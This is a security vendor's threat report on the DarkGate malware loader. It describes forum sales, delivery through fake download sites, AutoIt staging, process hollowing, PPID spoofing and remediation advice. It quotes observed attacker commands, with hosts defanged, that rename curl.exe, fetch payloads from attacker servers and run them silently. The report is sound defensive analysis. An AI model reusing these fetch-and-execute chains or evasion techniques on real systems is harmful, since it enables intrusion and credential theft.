Adversaries don’t work 9-5 and neither do we. At eSentire, our 24/7 SOCs are staffed with
Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to
threats within minutes.

We have discovered some of the most dangerous threats and nation state attacks in our
space – including the Kaseya MSP breach and the more_eggs malware.

Our Security Operations Centers are supported with Threat Intelligence, Tactical Threat
Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU
team.

In TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent
threat investigation. We outline how we responded to the confirmed threat and what
recommendations we have going forward.

Here’s the latest from our TRU Team…

What did we find?
Since August 2023, the eSentire Threat Response Unit (TRU) has observed two cases of
DarkGate infection targeting the Finance and Manufacturing industries. The stealer was
delivered via drive-by downloads disguised as fake installers, such as an Advanced IP
scanner, as well as fake document reports.

DarkGate, a loader written in Borland Delphi, was first announced for sale on a Russian-
speaking hacking forum in early June 2023. The loader developer claimed to have been
working on the project since 2017. DarkGate has an extensive list of features, including

hVNC, hAnyDesk, credential stealing, crypto mining, rootkit, reverse proxy, keylogger,
remote desktop, etc. The loader is priced at $1,000 for a one-day use and $15,000 for
monthly usage.

For the initial access, the loader delivers in a format of LNK, VBS, and MSI, which leads to
the execution of the AutoIt script.

The developer of DarkGate has announced a CrackMe challenge on the forum, offering a
reward of $30,000 to anyone who can bypass the licensing system of the loader's
builder/panel.

Figure 2: CrackMe challenge announcement
The DarkGate loader has grown significantly in popularity, with the developer stating it
reached 30 users per month. However, the developer is no longer issuing licenses to new
users.

Figure 3: Announcement to stop providing new licenses
RastaFarEye, the mastermind behind DarkGate, is reputed to be a seasoned malware
developer, according to users on hacking forums. He is also believed to be the creator of the
stealer identified by Kaspersky as “GreetingGhoul”.

Delivery and Technical Analysis
The initial access occurred via a drive-by download. The user was searching for unclaimed
money and navigated to the malicious site via Google Ads and downloaded an automatically
generated fake report as a ZIP archive that contained the malicious VBS script.

Figure 6: Malicious website serving the payload
We found three additional websites potentially serving the payloads:

freelookup[.]org
treasurydept[.]org
capitalfinders[.]org

5/17



Interestingly enough, Danabot used the same payload delivery technique reported by a
Threat Researcher at Proofpoint.

Figure 7: Twitter thread on the same delivery technique used by DanaBot
The VBS script leads to the execution of the following command:

"/c cd /d C:\Users\%USERNAME%\AppData\Local\Temp\ & copy
c:\windows\system32\curl[.]exe HnVMJmSBX[.]exe & HnVMJmSBX[.]exe -o
aDRQdO[.]msi hxxps[://]plano[.]soulcarelife[.]org/?5nzumurxizhrb3bpztdybha98e8 &
C:\Windows\System32\msiexec[.]exe /i aDRQdO[.]msi /qn"

The script retrieves the MSI installer from one of the attacker-controlled servers. 

6/17



Figure 8: Malicious VBS script delivering DarkGate MSI installer
The execution of MSI installer eventually leads to the following command execution:

 
"C:\Windows\System32\cmd[.]exe" /c mkdir c:\bclr & cd /d c:\bclr & copy
c:\windows\system32\curl.exe bclr.exe & bclr -H "User-Agent: curl" -o Autoit3.exe
hxxp[://]whatup[.]cloud:9999 & bclr -o kdvyeg.au3
hxxp[://]whatup[.]cloud:9999/msibclrlapx & Autoit3.exe kdvyeg.au3

The command creates the bclr directory under C:\, copies curl.exe from
C:\Windows\system32 and renames it as bclr.exe to bclr directory, and downloads
kdvyeg.au3 (MD5: 296c88dda6b9864da68f0918a6a7280d) (DarkGate AutoIT script) and
Autoit3.exe files.

Threat Analyst @0xToxin already performed a great analysis of the AutoIt script that can be
accessed here.

Upon initial infection, DarkGate achieves persistence on the host via the Startup folder to run
the malicious AutoIt script dropped under the ProgramData folder as shown below. The
shortcut file is removed by the injected process and recreated periodically, which makes it
hard for an analyst to identify the persistence mechanism.

In the case we were investigating, the loader opens the decoy PDF file shown below.

Compared to the previous version of DarkGate where the final DarkGate payload would be
decrypted via an XOR routine, the latest DarkGate version utilizes a custom base64-
encoding algorithm, as shown below.

8/17



Figure 11: Custom base64-decoding function
We wrote the script to decode the .au3 payload that you can access here.

In the previous version, when decrypting the final payload, it contained a configuration with a
custom base64-encoded string. In the newer version, the configuration and the C2 domains
are separated into two distinct parts. The configuration part is ZLIB-compressed and custom
base64-encoded. You can access the script to extract the configuration and C2 domains
here.

Figure 12:

Extracted configuration
As mentioned above, DarkGate has the hVNC capability. From the snippet shown below, the
hVNC is broken into different phases including Cleaning Virtual Desk Processes Phase
involving thread termination, Browser Handling Phase (possibly handling certain browser

10/17



attributes or configurations), and Optimization Phase where certain browser settings are
disabled for a better performance such as disabling audio, sandboxing feature, disabling
GPU hardware acceleration etc.

Figure 13: hVNC functionality
DarkGate performs process hollowing for the core and additional payloads into one of the
processes:

GoogleUpdate.exe
TabTip32.exe
BraveUpdate.exe
MicrosoftEdgeUpdate.exe
ielowutil.exe

If process hollowing fails for the above processes, DarkGate proceeds with injecting into
cmd.exe which subsequently spawns notepad.exe. We have observed DarkGate injecting
DanaBot into notepad.exe. Additionally, the UAC bypass module was also used for injection.
Upon terminating the injected process, DarkGate implements PPID spoofing (Parent Process
ID Spoofing).

PPID spoofing involves manipulating the parent process ID attribute of a newly created
process. This is done to deceive security solutions into believing the new process was
created by a legitimate parent process.

In case there is an attempt to terminate this malicious process, it has the capability to
reinitialize itself under another spoofed parent process, continuing its malicious activities
while staying under the radar.

11/17



Figure 14: The function responsible for PPID spoofing
In the code snippet provided, the DarkGate malware attempts to open the desired process
and spoof it, repeating the attempt up to 12 times until successful. This process involves
initializing and updating a thread attribute list. If successful, the execution flow progresses to
a function where it allocates memory within the targeted process, writes malicious code into
that memory space, and initiates a new thread within the target process to execute the
injected code.

If the spoofing attempts fail after 12 tries, it exits with an error, specifically indicating an
“InjectCustomShellcodeWithParamsAndSpoff failure”.

We can confirm whether the loader is using the PPID spoofing technique by running the
Despoof tool that detects process spoofing written by our Principal Security Researcher,
Jacob Gajek.

DarkGate has the ability to manipulate browser data, delete shadow copies (provided the
user has administrative rights), and initiate a shutdown of the infected host.

Figure 16: Additional DarkGate functionalities including system shutdown and browser folder
manipulations
It’s also worth mentioning that compared to previous versions of DarkGate, where the strings
were encoded with custom base64-encoded strings, with the new version the byte arrays are
used as inputs instead to break the existing scripts to decode the custom base64-encoded
strings.

What did we do?

13/17



Our team of 24/7 SOC Cyber Analysts isolated the affected host to contain the
infection.
Provided remediation recommendations and support to the customer.

What can you learn from this TRU Positive?
The DarkGate loader is rapidly becoming favored amongst threat actors owing to its
stealth features and extensive array of capabilities.
The loader is using PPID spoofing to evade detections.
In the infection chain we observed, DanaBot appears to be deployed by the DarkGate
loader.

Recommendations from our Threat Response Unit (TRU) Team:
Protecting against information stealers requires a multi-layered defense approach to defend
endpoints from malware and detect or block unauthorized login activity against applications
and remote access services.

Therefore, we recommend:

Protecting endpoints against malware.

Ensure antivirus signatures are up to date.

Use a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) product to
detect and contain threats.
If an information stealing malware is identified, reset the user’s credentials, and
terminate logon sessions immediately.

Encouraging good cybersecurity hygiene among your users by using Phishing and
Security Awareness Training (PSAT) when downloading software from the Internet.
Restricting access to enterprise applications from personal devices outside the scope
of security monitoring.
Ensuring adequate logging is in place for remote access services such as VPNs and
using modern authentication methods, which support MFA and conditional access.
Prevent web browsers from automatically saving and storing passwords.

Use of reputable password managers is recommended instead.
